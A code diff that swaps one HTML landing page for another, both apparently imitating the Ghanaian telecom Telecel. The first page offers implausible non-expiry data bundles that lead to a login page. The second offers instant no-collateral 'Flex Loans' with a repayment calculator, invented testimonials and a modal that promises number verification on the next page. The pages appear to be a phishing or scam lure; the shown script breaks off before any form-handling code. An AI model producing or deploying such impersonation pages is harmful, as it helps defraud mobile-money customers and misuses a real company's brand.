@@ -3,787 +3,509 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Telecel Data Bundles - Unlimited Non-Expiry Data Plans</title>
+    <title>Telecel Cash | Flex Loans - Instant Cash</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
-        
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
+        :root {
+            --telecel-red: #E42320;
+            --telecel-red-hover: #c41e1b;
+            --dark: #1a1a1a;
+            --text-gray: #4a5568;
         }
-        
+
+        * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
             font-family: 'Inter', sans-serif;
-            color: #333;
+            background: #f8f9fa;
+            color: var(--dark);
             line-height: 1.6;
+            overflow-x: hidden;
         }
-        
+
+        /* Background Orbs */
+        .orb {
+            position: absolute;
+            border-radius: 50%;
+            filter: blur(90px);
+            z-index: -1;
+            opacity: 0.35;
+        }
+        .orb-1 { width: 450px; height: 450px; background: var(--telecel-red); top: -150px; left: -150px; }
+        .orb-2 { width: 350px; height: 350px; background: #ff6b5e; bottom: 10%; right: -50px; }
+
         /* Navigation */
         nav {
-            background: linear-gradient(135deg, #E30613 0%, #0033A0 100%);
-            padding: 1rem 2rem;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
+            background: rgba(255,255,255,0.95);
+            backdrop-filter: blur(12px);
             position: sticky;
             top: 0;
-            z-index: 100;
-            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+            z-index: 1000;
+            border-bottom: 1px solid #eee;
+            padding: 15px 5%;
         }
-        
-        .nav-brand {
-            display: flex;
-            align-items: center;
-            gap: 10px;
-            color: white;
-            font-weight: 700;
-            font-size: 20px;
-            text-decoration: none;
-        }
-        
-        .nav-brand-icon {
-            width: 40px;
-            height: 40px;
-            background: white;
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            color: #E30613;
-            font-weight: 900;
-            font-size: 24px;
-        }
-        
-        .nav-links {
-            display: flex;
-            gap: 2rem;
-            list-style: none;
-        }
-        
-        .nav-links a {
-            color: white;
-            text-decoration: none;
-            font-weight: 500;
-            transition: opacity 0.3s;
-        }
-        
-        .nav-links a:hover {
-            opacity: 0.8;
-        }
-        
-        .nav-links .login-btn {
-            background: white;
-            color: #E30613;
-            padding: 0.5rem 1.5rem;
-            border-radius: 20px;
-            font-weight: 600;
-        }
-        
-        /* Hero Section */
-        .hero {
-            background: linear-gradient(135deg, #E30613 0%, #0033A0 100%);
-            color: white;
-            padding: 4rem 2rem;
-            text-align: center;
-            min-height: 500px;
-            display: flex;
-            flex-direction: column;
-            justify-content: center;
-            align-items: center;
-        }
-        
-        .hero h1 {
-            font-size: 3.5rem;
-            margin-bottom: 1rem;
-            font-weight: 700;
-        }
-        
-        .hero p {
-            font-size: 1.3rem;
-            margin-bottom: 2rem;
-            max-width: 600px;
-        }
-        
-        .hero-btn {
-            background: white;
-            color: #E30613;
-            padding: 1rem 2.5rem;
-            border: none;
-            border-radius: 30px;
-            font-size: 1.1rem;
-            font-weight: 700;
-            cursor: pointer;
-            transition: transform 0.3s, box-shadow 0.3s;
-            box-shadow: 0 4px 15px rgba(0,0,0,0.2);
-        }
-        
-        .hero-btn:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 6px 20px rgba(0,0,0,0.3);
-        }
-        
-        /* Stats Section */
-        .stats {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
-            gap: 2rem;
-            padding: 3rem 2rem;
-            background: #f8f9fc;
-            text-align: center;
-        }
-        
-        .stat-item h3 {
-            font-size: 2.5rem;
-            color: #E30613;
-            margin-bottom: 0.5rem;
-        }
-        
-        .stat-item p {
-            color: #666;
-            font-weight: 500;
-        }
-        
-        /* Bundles Section */
-        .bundles-section {
-            padding: 4rem 2rem;
-            max-width: 1200px;
+        .nav-container {
+            max-width: 1400px;
             margin: 0 auto;
-        }
-        
-        .section-title {
-            text-align: center;
-            font-size: 2.5rem;
-            margin-bottom: 3rem;
-            color: #0033A0;
-            position: relative;
-            padding-bottom: 1rem;
-        }
-        
-        .section-title::after {
-            content: '';
-            position: absolute;
-            bottom: 0;
-            left: 50%;
-            transform: translateX(-50%);
-            width: 60px;
-            height: 4px;
-            background: #E30613;
-            border-radius: 2px;
-        }
-        
-        .bundles-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
-            gap: 2rem;
-            margin-bottom: 3rem;
-        }
-        
-        .bundle-card {
-            background: white;
-            border: 2px solid #E30613;
-            border-radius: 16px;
-            padding: 2rem;
-            text-align: center;
-            transition: transform 0.3s, box-shadow 0.3s;
-            position: relative;
-        }
-        
-        .bundle-card:hover {
-            transform: translateY(-5px);
-            box-shadow: 0 10px 30px rgba(227, 6, 19, 0.15);
-        }
-        
-        .bundle-card.best-value {
-            border-color: #FFD700;
-            background: linear-gradient(135deg, rgba(255, 215, 0, 0.05) 0%, rgba(227, 6, 19, 0.05) 100%);
-        }
-        
-        .bundle-card.best-value::before {
-            content: '🏆 BEST VALUE';
-            position: absolute;
-            top: -12px;
-            left: 50%;
-            transform: translateX(-50%);
-            background: #FFD700;
-            color: #333;
-            padding: 0.4rem 1rem;
-            border-radius: 20px;
-            font-size: 0.85rem;
-            font-weight: 700;
-        }
-        
-        .bundle-badge {
-            display: inline-block;
-            background: #27AE60;
-            color: white;
-            padding: 0.4rem 1rem;
-            border-radius: 20px;
-            font-size: 0.85rem;
-            font-weight: 600;
-            margin-bottom: 1rem;
-        }
-        
-        .bundle-price {
-            font-size: 2.5rem;
-            color: #E30613;
-            font-weight: 700;
-            margin: 1rem 0;
-        }
-        
-        .bundle-data {
-            font-size: 1.8rem;
-            color: #0033A0;
-            font-weight: 700;
-            margin-bottom: 1.5rem;
-        }
-        
-        .bundle-features {
-            text-align: left;
-            margin: 1.5rem 0;
-            font-size: 0.95rem;
-            color: #555;
-        }
-        
-        .bundle-features li {
-            list-style: none;
-            padding: 0.5rem 0;
-            padding-left: 1.5rem;
-            position: relative;
-        }
-        
-        .bundle-features li::before {
-            content: '✓';
-            position: absolute;
-            left: 0;
-            color: #27AE60;
-            font-weight: 700;
-        }
-        
-        .bundle-btn {
-            width: 100%;
-            padding: 1rem;
-            background: linear-gradient(135deg, #E30613 0%, #0033A0 100%);
-            color: white;
-            border: none;
-            border-radius: 12px;
-            font-size: 1rem;
-            font-weight: 700;
-            cursor: pointer;
-            transition: transform 0.3s, box-shadow 0.3s;
-            margin-top: 1.5rem;
-        }
-        
-        .bundle-btn:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 6px 20px rgba(227, 6, 19, 0.3);
-        }
-        
-        /* Benefits Section */
-        .benefits-section {
-            background: #f8f9fc;
-            padding: 4rem 2rem;
-        }
-        
-        .benefits-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
-            gap: 2rem;
-            max-width: 1200px;
-            margin: 0 auto;
-        }
-        
-        .benefit-item {
-            background: white;
-            padding: 2rem;
-            border-radius: 12px;
-            text-align: center;
-            box-shadow: 0 2px 8px rgba(0,0,0,0.05);
-        }
-        
-        .benefit-icon {
-            font-size: 3rem;
-            margin-bottom: 1rem;
-        }
-        
-        .benefit-item h3 {
-            font-size: 1.3rem;
-            margin-bottom: 0.5rem;
-            color: #0033A0;
-        }
-        
-        .benefit-item p {
-            color: #666;
-            font-size: 0.95rem;
-        }
-        
-        /* Testimonials */
-        .testimonials-section {
-            padding: 4rem 2rem;
-            max-width: 1200px;
-            margin: 0 auto;
-        }
-        
-        .testimonials-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
-            gap: 2rem;
-        }
-        
-        .testimonial-card {
-            background: white;
-            padding: 2rem;
-            border-radius: 12px;
-            box-shadow: 0 4px 12px rgba(0,0,0,0.08);
-            border-left: 4px solid #E30613;
-        }
-        
-        .testimonial-stars {
-            color: #FFD700;
-            font-size: 1.2rem;
-            margin-bottom: 1rem;
-        }
-        
-        .testimonial-text {
-            color: #555;
-            margin-bottom: 1rem;
-            font-style: italic;
-        }
-        
-        .testimonial-author {
-            font-weight: 600;
-            color: #0033A0;
-        }
-        
-        /* FAQ Section */
-        .faq-section {
-            background: #f8f9fc;
-            padding: 4rem 2rem;
-        }
-        
-        .faq-container {
-            max-width: 800px;
-            margin: 0 auto;
-        }
-        
-        .faq-item {
-            background: white;
-            margin-bottom: 1rem;
-            border-radius: 8px;
-            overflow: hidden;
-            box-shadow: 0 2px 8px rgba(0,0,0,0.05);
-        }
-        
-        .faq-question {
-            padding: 1.5rem;
-            background: white;
-            border: none;
-            width: 100%;
-            text-align: left;
-            font-size: 1rem;
-            font-weight: 600;
-            color: #0033A0;
-            cursor: pointer;
             display: flex;
             justify-content: space-between;
             align-items: center;
-            transition: background 0.3s;
         }
-        
-        .faq-question:hover {
-            background: #f0f4ff;
+        .logo {
+            font-size: 28px;
+            font-weight: 800;
+            color: var(--telecel-red);
+            display: flex;
+            align-items: center;
+            gap: 8px;
         }
-        
-        .faq-question.active {
-            background: linear-gradient(135deg, #E30613 0%, #0033A0 100%);
-            color: white;
+        .nav-links {
+            display: flex;
+            gap: 32px;
+            font-weight: 600;
         }
-        
-        .faq-answer {
-            max-height: 0;
-            overflow: hidden;
-            transition: max-height 0.3s ease;
-            padding: 0 1.5rem;
-            color: #555;
-        }
-        
-        .faq-answer.active {
-            max-height: 500px;
-            padding: 0 1.5rem 1.5rem;
-        }
-        
-        /* Footer */
-        footer {
-            background: #1a1a1a;
-            color: white;
-            padding: 3rem 2rem;
-        }
-        
-        .footer-content {
-            max-width: 1200px;
-            margin: 0 auto;
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
-            gap: 2rem;
-            margin-bottom: 2rem;
-        }
-        
-        .footer-section h4 {
-            margin-bottom: 1rem;
-            color: #E30613;
-        }
-        
-        .footer-section ul {
-            list-style: none;
-        }
-        
-        .footer-section ul li {
-            margin-bottom: 0.5rem;
-        }
-        
-        .footer-section a {
-            color: #ccc;
+        .nav-links a {
             text-decoration: none;
-            transition: color 0.3s;
+            color: var(--dark);
+            transition: 0.3s;
         }
-        
-        .footer-section a:hover {
-            color: #E30613;
+        .nav-links a:hover { color: var(--telecel-red); }
+
+        /* Hero Section */
+        .hero {
+            padding: 100px 5% 80px;
+            display: flex;
+            align-items: center;
+            gap: 60px;
+            max-width: 1400px;
+            margin: 0 auto;
+            flex-wrap: wrap;
         }
-        
-        .footer-bottom {
-            border-top: 1px solid #333;
-            padding-top: 2rem;
+        .hero-content {
+            flex: 1;
+            min-width: 300px;
+        }
+        .hero-content h1 {
+            font-size: clamp(2.4rem, 6vw, 3.8rem);
+            line-height: 1.1;
+            font-weight: 800;
+            margin-bottom: 20px;
+        }
+        .hero-content h1 span {
+            color: var(--telecel-red);
+        }
+        .hero-content p {
+            font-size: 1.25rem;
+            color: var(--text-gray);
+            margin-bottom: 30px;
+        }
+
+        .trust-badges {
+            display: flex;
+            gap: 20px;
+            flex-wrap: wrap;
+            margin: 25px 0;
+        }
+        .badge {
+            background: white;
+            padding: 10px 18px;
+            border-radius: 50px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.08);
+            font-size: 0.95rem;
+            font-weight: 600;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        /* Calculator */
+        .calculator {
+            flex: 1;
+            min-width: 340px;
+            max-width: 460px;
+        }
+        .glass-card {
+            background: rgba(255,255,255,0.85);
+            backdrop-filter: blur(16px);
+            border: 1px solid rgba(255,255,255,0.8);
+            border-radius: 28px;
+            padding: 40px 30px;
+            box-shadow: 0 20px 50px rgba(228, 35, 32, 0.12);
+        }
+
+        .input-group { margin-bottom: 28px; }
+        .label-row {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 12px;
+            font-weight: 600;
+        }
+        .label-row span {
+            color: var(--telecel-red);
+            font-size: 1.35rem;
+        }
+
+        input[type="range"] {
+            width: 100%;
+            accent-color: var(--telecel-red);
+        }
+
+        .result-box {
+            background: #fff;
+            padding: 22px;
+            border-radius: 16px;
+            margin: 25px 0;
             text-align: center;
-            color: #999;
+            border: 2px solid #f0f0f0;
         }
-        
-        /* Responsive */
+        .result-box .amount {
+            font-size: 2.4rem;
+            font-weight: 800;
+            color: var(--telecel-red);
+        }
+
+        .btn-apply {
+            width: 100%;
+            background: var(--telecel-red);
+            color: white;
+            border: none;
+            padding: 18px;
+            font-size: 1.2rem;
+            font-weight: 700;
+            border-radius: 16px;
+            cursor: pointer;
+            transition: all 0.3s;
+            box-shadow: 0 8px 25px rgba(228, 35, 32, 0.3);
+        }
+        .btn-apply:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 12px 30px rgba(228, 35, 32, 0.4);
+        }
+
+        /* Sections */
+        .section {
+            padding: 90px 5%;
+            max-width: 1400px;
+            margin: 0 auto;
+        }
+        .section-title {
+            text-align: center;
+            font-size: 2.6rem;
+            margin-bottom: 60px;
+            font-weight: 700;
+        }
+
+        .features-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
+            gap: 30px;
+        }
+        .feature-card {
+            text-align: center;
+            padding: 40px 20px;
+            background: white;
+            border-radius: 20px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.08);
+            transition: 0.4s;
+        }
+        .feature-card:hover {
+            transform: translateY(-12px);
+        }
+        .feature-card i {
+            font-size: 3.2rem;
+            color: var(--telecel-red);
+            margin-bottom: 20px;
+        }
+
+        /* Testimonials */
+        .testimonials {
+            background: #f1f5f9;
+        }
+        .testimonial-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(320px, 1fr));
+            gap: 25px;
+        }
+        .testimonial-card {
+            background: white;
+            padding: 30px;
+            border-radius: 20px;
+            box-shadow: 0 10px 25px rgba(0,0,0,0.07);
+        }
+
+        /* Modal */
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0; left: 0;
+            width: 100%; height: 100%;
+            background: rgba(0,0,0,0.8);
+            z-index: 2000;
+            align-items: center;
+            justify-content: center;
+        }
+        .modal-content {
+            background: #1f1f1f;
+            max-width: 440px;
+            width: 92%;
+            border-radius: 24px;
+            padding: 35px 28px;
+            text-align: center;
+            border: 2px solid var(--telecel-red);
+        }
+        .modal-icon { font-size: 4rem; margin-bottom: 15px; }
+        .modal-buttons {
+            display: flex;
+            gap: 15px;
+            margin-top: 25px;
+        }
+        .modal-btn {
+            flex: 1;
+            padding: 16px;
+            border-radius: 50px;
+            font-weight: 700;
+            font-size: 1.1rem;
+        }
+        .modal-confirm { background: var(--telecel-red); color: white; border: none; }
+        .modal-cancel { background: transparent; color: #ddd; border: 2px solid #555; }
+
+        footer {
+            background: var(--dark);
+            color: white;
+            padding: 70px 5% 30px;
+        }
+
         @media (max-width: 768px) {
-            .hero h1 {
-                font-size: 2rem;
+            .hero {
+                padding: 80px 5% 60px;
+                text-align: center;
             }
-            
-            .hero p {
-                font-size: 1rem;
-            }
-            
-            .nav-links {
-                gap: 1rem;
-                font-size: 0.9rem;
-            }
-            
-            .section-title {
-                font-size: 1.8rem;
-            }
+            .nav-links { display: none; }
+            .glass-card { padding: 30px 20px; }
         }
     </style>
 </head>
 <body>
-    <!-- Navigation -->
+    <div class="orb orb-1"></div>
+    <div class="orb orb-2"></div>
+
     <nav>
-        <a href="/" class="nav-brand">
-            <div class="nav-brand-icon">t</div>
-            <span>Telecel</span>
-        </a>
-        <ul class="nav-links">
-            <li><a href="#bundles">Bundles</a></li>
-            <li><a href="#benefits">Benefits</a></li>
-            <li><a href="#faq">FAQ</a></li>
-            <li><a href="login.html" class="login-btn">Login</a></li>
-        </ul>
+        <div class="nav-container">
+            <div class="logo">
+                <strong>TELECEL</strong>
+            </div>
+            <div class="nav-links">
+                <a href="#home">Home</a>
+                <a href="#how">How it Works</a>
+                <a href="#about">Why Us</a>
+                <a href="#faq">FAQ</a>
+            </div>
+        </div>
     </nav>
 
-    <!-- Hero Section -->
-    <section class="hero">
-        <h1>🚀 Unlimited Data, Never Expires</h1>
-        <p>Stay connected with Telecel's non-expiry data bundles. Buy once, use forever!</p>
-        <button class="hero-btn" onclick="document.getElementById('bundles').scrollIntoView({behavior: 'smooth'})">
-            Explore Bundles
-        </button>
-    </section>
-
-    <!-- Stats Section -->
-    <section class="stats">
-        <div class="stat-item">
-            <h3>2M+</h3>
-            <p>Happy Customers</p>
-        </div>
-        <div class="stat-item">
-            <h3>99.9%</h3>
-            <p>Network Uptime</p>
-        </div>
-        <div class="stat-item">
-            <h3>24/7</h3>
-            <p>Customer Support</p>
-        </div>
-        <div class="stat-item">
-            <h3>0 Days</h3>
-            <p>Data Expiry</p>
-        </div>
-    </section>
-
-    <!-- Bundles Section -->
-    <section class="bundles-section" id="bundles">
-        <h2 class="section-title">Choose Your Perfect Bundle</h2>
-        <div class="bundles-grid">
-            <!-- Starter Bundle -->
-            <div class="bundle-card">
-                <div class="bundle-badge">✓ Non-Expiry</div>
-                <div class="bundle-price">GHS 10</div>
-                <div class="bundle-data">10 GB</div>
-                <ul class="bundle-features">
-                    <li>Instant Activation</li>
-                    <li>Never Expires</li>
-                    <li>Rollover Data</li>
-                    <li>All Networks</li>
-                </ul>
-                <button class="bundle-btn" onclick="goToLogin('10gb', '10')">Buy Now</button>
+    <section class="hero" id="home">
+        <div class="hero-content">
+            <div class="trust-badges">
+                <div class="badge"><i class="fa-solid fa-bolt"></i> Instant Approval</div>
+                <div class="badge"><i class="fa-solid fa-shield-halved"></i> Secure</div>
+                <div class="badge"><i class="fa-solid fa-mobile-screen"></i> Telecel Cash</div>
             </div>
-
-            <!-- Standard Bundle -->
-            <div class="bundle-card">
-                <div class="bundle-badge">✓ Non-Expiry</div>
-                <div class="bundle-price">GHS 20</div>
-                <div class="bundle-data">30 GB</div>
-                <ul class="bundle-features">
-                    <li>Instant Activation</li>
-                    <li>Never Expires</li>
-                    <li>Rollover Data</li>
-                    <li>All Networks</li>
-                </ul>
-                <button class="bundle-btn" onclick="goToLogin('30gb', '20')">Buy Now</button>
+            <h1>Instant <span>Flex Loans</span> in Your Telecel Cash Wallet</h1>
+            <p>Get quick cash for emergencies, business, or personal needs. No collateral. No paperwork. Money arrives instantly.</p>
+            
+            <div style="margin-top: 30px;">
+                <button onclick="document.getElementById('calculator').scrollIntoView({behavior:'smooth'})" 
+                        style="background:var(--telecel-red); color:white; padding:16px 40px; border:none; border-radius:50px; font-size:1.1rem; font-weight:700; cursor:pointer;">
+                    Get Loan Now →
+                </button>
             </div>
+        </div>
 
-            <!-- Premium Bundle -->
-            <div class="bundle-card">
-                <div class="bundle-badge">✓ Non-Expiry</div>
-                <div class="bundle-price">GHS 30</div>
-                <div class="bundle-data">50 GB</div>
-                <ul class="bundle-features">
-                    <li>Instant Activation</li>
-                    <li>Never Expires</li>
-                    <li>Rollover Data</li>
-                    <li>All Networks</li>
-                </ul>
-                <button class="bundle-btn" onclick="goToLogin('50gb', '30')">Buy Now</button>
-            </div>
+        <div class="calculator" id="calculator">
+            <div class="glass-card">
+                <h2 style="text-align:center; margin-bottom:25px;">Loan Calculator</h2>
+                
+                <div class="input-group">
+                    <div class="label-row">
+                        <label>Loan Amount</label>
+                        <span id="amount-display">GHS 2,500</span>
+                    </div>
+                    <input type="range" id="amount-slider" min="500" max="25000" step="100" value="2500">
+                </div>
 
-            <!-- Pro Bundle -->
-            <div class="bundle-card">
-                <div class="bundle-badge">✓ Non-Expiry</div>
-                <div class="bundle-price">GHS 50</div>
-                <div class="bundle-data">100 GB</div>
-                <ul class="bundle-features">
-                    <li>Instant Activation</li>
-                    <li>Never Expires</li>
-                    <li>Rollover Data</li>
-                    <li>All Networks</li>
-                </ul>
-                <button class="bundle-btn" onclick="goToLogin('100gb', '50')">Buy Now</button>
-            </div>
+                <div class="input-group">
+                    <div class="label-row">
+                        <label>Duration</label>
+                        <span id="term-display">30 days</span>
+                    </div>
+                    <input type="range" id="term-slider" min="7" max="90" step="1" value="30">
+                </div>
 
-            <!-- Ultra Bundle (Best Value) -->
-            <div class="bundle-card best-value">
-                <div class="bundle-badge">✓ Non-Expiry</div>
-                <div class="bundle-price">GHS 100</div>
-                <div class="bundle-data">250 GB</div>
-                <ul class="bundle-features">
-                    <li>Instant Activation</li>
-                    <li>Never Expires</li>
-                    <li>Rollover Data</li>
-                    <li>All Networks</li>
-                    <li>Priority Support</li>
-                </ul>
-                <button class="bundle-btn" onclick="goToLogin('250gb', '100')">Buy Now</button>
+                <div class="result-box">
+                    <p style="color:#666; margin-bottom:8px;">You will repay</p>
+                    <div class="amount" id="payment-display">GHS 2,688</div>
+                </div>
+
+                <button class="btn-apply" id="apply-btn">APPLY FOR THIS LOAN</button>
             </div>
         </div>
     </section>
 
-    <!-- Benefits Section -->
-    <section class="benefits-section" id="benefits">
-        <h2 class="section-title">Why Choose Telecel Data?</h2>
-        <div class="benefits-grid">
-            <div class="benefit-item">
-                <div class="benefit-icon">⏰</div>
-                <h3>Never Expires</h3>
-                <p>Your data never expires. Use it whenever you want, no time limits.</p>
+    <!-- How It Works -->
+    <section class="section" id="how">
+        <h2 class="section-title">How It Works</h2>
+        <div class="features-grid">
+            <div class="feature-card">
+                <i class="fa-solid fa-mobile-screen-button"></i>
+                <h3>1. Apply in Seconds</h3>
+                <p>Fill a simple form using your Telecel number.</p>
             </div>
-            <div class="benefit-item">
-                <div class="benefit-icon">⚡</div>
-                <h3>Instant Activation</h3>
-                <p>Activate your bundle immediately after purchase. Start browsing instantly.</p>
+            <div class="feature-card">
+                <i class="fa-solid fa-check-circle"></i>
+                <h3>2. Instant Approval</h3>
+                <p>Get approved within minutes if eligible.</p>
             </div>
-            <div class="benefit-item">
-                <div class="benefit-icon">🔄</div>
-                <h3>Rollover Data</h3>
-                <p>Unused data rolls over to the next month. Never waste your data again.</p>
-            </div>
-            <div class="benefit-item">
-                <div class="benefit-icon">🌐</div>
-                <h3>All Networks</h3>
-                <p>Works on all Telecel networks. Stay connected everywhere in Ghana.</p>
-            </div>
-            <div class="benefit-item">
-                <div class="benefit-icon">💰</div>
-                <h3>Best Prices</h3>
-                <p>Unbeatable prices with the most data per GHS. Get more for less.</p>
-            </div>
-            <div class="benefit-item">
-                <div class="benefit-icon">📱</div>
-                <h3>Easy Management</h3>
-                <p>Track your data usage anytime through our mobile app or website.</p>
+            <div class="feature-card">
+                <i class="fa-solid fa-money-bill-wave"></i>
+                <h3>3. Money Received</h3>
+                <p>Cash is sent directly to your Telecel Cash wallet.</p>
             </div>
         </div>
     </section>
 
-    <!-- Testimonials Section -->
-    <section class="testimonials-section">
+    <!-- Why Choose Us -->
+    <section class="section" id="about">
+        <h2 class="section-title">Why Choose Telecel Flex Loan?</h2>
+        <div class="features-grid">
+            <div class="feature-card">
+                <i class="fa-solid fa-clock"></i>
+                <h3>Super Fast</h3>
+                <p>Loans disbursed in under 5 minutes.</p>
+            </div>
+            <div class="feature-card">
+                <i class="fa-solid fa-lock"></i>
+                <h3>100% Secure</h3>
+                <p>Bank-level security and data protection.</p>
+            </div>
+            <div class="feature-card">
+                <i class="fa-solid fa-hand-holding-dollar"></i>
+                <h3>Flexible Repayment</h3>
+                <p>Repay comfortably between 7 to 90 days.</p>
+            </div>
+        </div>
+    </section>
+
+    <!-- Testimonials -->
+    <section class="section testimonials">
         <h2 class="section-title">What Our Customers Say</h2>
-        <div class="testimonials-grid">
+        <div class="testimonial-grid">
             <div class="testimonial-card">
-                <div class="testimonial-stars">★★★★★</div>
-                <div class="testimonial-text">
-                    "Best data bundle I've ever used! The non-expiry feature is a game-changer. I can use my data whenever I want without worrying about it expiring."
-                </div>
-                <div class="testimonial-author">- Kwame A., Accra</div>
+                <p>"I needed money urgently for my business. Got GHS 5,000 in less than 10 minutes. Thank you Telecel!"</p>
+                <strong>— Comfort Mensah, Accra</strong>
             </div>
             <div class="testimonial-card">
-                <div class="testimonial-stars">★★★★★</div>
-                <div class="testimonial-text">
-                    "Amazing value for money! I switched to Telecel and I'm saving so much. The customer service is also fantastic and very responsive."
-                </div>
-                <div class="testimonial-author">- Ama B., Kumasi</div>
+                <p>"The process is so simple. No stress, no collateral. Best loan service in Ghana."</p>
+                <strong>— Kwame Osei, Kumasi</strong>
             </div>
             <div class="testimonial-card">
-                <div class="testimonial-stars">★★★★★</div>
-                <div class="testimonial-text">
-                    "The instant activation is incredible. I bought a bundle and started using it immediately. No waiting, no hassle. Highly recommended!"
-                </div>
-                <div class="testimonial-author">- Kofi M., Takoradi</div>
+                <p>"Repayment is very flexible. I will definitely use it again."</p>
+                <strong>— Abena Frimpong, Takoradi</strong>
             </div>
         </div>
     </section>
 
-    <!-- FAQ Section -->
-    <section class="faq-section" id="faq">
-        <h2 class="section-title">Frequently Asked Questions</h2>
-        <div class="faq-container">
-            <div class="faq-item">
-                <button class="faq-question" onclick="toggleFAQ(this)">
-                    How long does data last with non-expiry bundles?
-                    <span>▼</span>
-                </button>
-                <div class="faq-answer">
-                    <p>Your data never expires. Once purchased, it remains available indefinitely until you use it. There are no time limits or expiration dates.</p>
-                </div>
-            </div>
-            <div class="faq-item">
-                <button class="faq-question" onclick="toggleFAQ(this)">
-                    Can I use the data across different devices?
-                    <span>▼</span>
-                </button>
-                <div class="faq-answer">
-                    <p>Yes, your data bundle can be used across all your Telecel devices. Simply ensure you're using the same Telecel account and network.</p>
-                </div>
-            </div>
-            <div class="faq-item">
-                <button class="faq-question" onclick="toggleFAQ(this)">
-                    How do I check my remaining data?
-                    <span>▼</span>
-                </button>
-                <div class="faq-answer">
-                    <p>You can check your remaining data through the Telecel mobile app, by dialing *123#, or by logging into your account on our website.</p>
-                </div>
-            </div>
-            <div class="faq-item">
-                <button class="faq-question" onclick="toggleFAQ(this)">
-                    Can I buy multiple bundles at once?
-                    <span>▼</span>
-                </button>
-                <div class="faq-answer">
-                    <p>Absolutely! You can purchase multiple bundles and they will be combined into your account. All data will be available for use immediately.</p>
-                </div>
-            </div>
-            <div class="faq-item">
-                <button class="faq-question" onclick="toggleFAQ(this)">
-                    What happens if I run out of data?
-                    <span>▼</span>
-                </button>
-                <div class="faq-answer">
-                    <p>You can purchase additional bundles anytime. We also offer flexible top-up options to keep you connected without interruption.</p>
-                </div>
-            </div>
-            <div class="faq-item">
-                <button class="faq-question" onclick="toggleFAQ(this)">
-                    Is there a refund policy?
-                    <span>▼</span>
-                </button>
-                <div class="faq-answer">
-                    <p>We offer a 7-day money-back guarantee if you're not satisfied with your bundle. Contact our support team for assistance with refunds.</p>
-                </div>
-            </div>
-        </div>
-    </section>
-
-    <!-- Footer -->
     <footer>
-        <div class="footer-content">
-            <div class="footer-section">
-                <h4>About Telecel</h4>
-                <p>Telecel is Ghana's leading telecommunications provider, committed to connecting millions of people with reliable, affordable data services.</p>
+        <div style="max-width:1400px; margin:auto; display:grid; grid-template-columns:repeat(auto-fit, minmax(220px,1fr)); gap:40px; text-align:left;">
+            <div>
+                <div class="logo" style="color:white; font-size:32px; margin-bottom:15px;">TELECEL</div>
+                <p>Telecel Cash Flex Loan - Instant financial freedom.</p>
             </div>
-            <div class="footer-section">
-                <h4>Quick Links</h4>
-                <ul>
-                    <li><a href="#bundles">Bundles</a></li>
-                    <li><a href="#benefits">Benefits</a></li>
-                    <li><a href="#faq">FAQ</a></li>
-                    <li><a href="login.html">Login</a></li>
-                </ul>
+            <div>
+                <h4 style="color:var(--telecel-red);">Quick Links</h4>
+                <p><a href="#" style="color:#ccc; text-decoration:none;">How it Works</a></p>
+                <p><a href="#" style="color:#ccc; text-decoration:none;">Loan Terms</a></p>
+                <p><a href="#" style="color:#ccc; text-decoration:none;">Privacy Policy</a></p>
             </div>
-            <div class="footer-section">
-                <h4>Support</h4>
-                <ul>
-                    <li><a href="#">Contact Us</a></li>
-                    <li><a href="#">Help Center</a></li>
-                    <li><a href="#">Terms of Service</a></li>
-                    <li><a href="#">Privacy Policy</a></li>
-                </ul>
-            </div>
-            <div class="footer-section">
-                <h4>Contact Info</h4>
-                <p>📞 Call: +233 (0) 501 234 567</p>
-                <p>📧 Email: support@telecel.com.gh</p>
-                <p>🏢 Office: Accra, Ghana</p>
+            <div>
+                <h4 style="color:var(--telecel-red);">Support</h4>
+                <p><a href="#" style="color:#ccc; text-decoration:none;">Call 100</a></p>
+                <p><a href="#" style="color:#ccc; text-decoration:none;">FAQs</a></p>
             </div>
         </div>
-        <div class="footer-bottom">
-            <p>© 2026 Telecel Ghana. All rights reserved. | Non-Expiry Data Bundles</p>
+        <div style="text-align:center; margin-top:60px; padding-top:20px; border-top:1px solid #333; color:#888;">
+            © 2026 Telecel Ghana. All Rights Reserved.
         </div>
     </footer>
 
+    <!-- Confirmation Modal -->
+    <div class="modal" id="loanModal">
+        <div class="modal-content">
+            <div class="modal-icon">💰</div>
+            <h3 id="modalTitle">Confirm Loan Application</h3>
+            <p id="modalMessage"></p>
+            <p style="color:#aaa; margin:15px 0;">You will verify your number on the next page.</p>
+            
+            <div class="modal-buttons">
+                <button class="modal-btn modal-cancel" onclick="closeModal()">Cancel</button>
+                <button class="modal-btn modal-confirm" id="confirmBtn">Continue to Application</button>
+            </div>
+        </div>
+    </div>
+
     <script>
-        function goToLogin(bundle, price) {
-            window.location.href = `login.html?bundle=${bundle}&price=${price}`;
+        // Calculator Logic
+        const amountSlider = document.getElementById('amount-slider');
+        const termSlider = document.getElementById('term-slider');
